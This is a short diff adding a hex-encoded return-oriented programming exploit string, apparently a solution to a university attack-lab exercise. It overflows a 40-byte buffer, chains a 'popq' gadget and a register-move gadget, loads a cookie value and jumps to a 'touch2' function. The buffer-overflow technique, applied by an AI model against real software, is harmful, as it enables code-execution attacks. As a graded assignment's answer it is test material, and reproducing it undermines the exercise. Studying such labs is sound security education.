@@ -1,0 +1,18 @@
+/* buffer padding 0x28 or 40 */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+
+/* gadget 1 using popq */ 
+c3 16 40 00 00 00 00 00
+
+/* cookie hexadecimal value */
+1b 91 ef 7f 00 00 00 00
+
+/* gadget 2 using %rax and %rdi */
+d0 16 40 00 00 00 00 00
+
+/* touch2 address */
+08 15 40 00 00 00 00 00
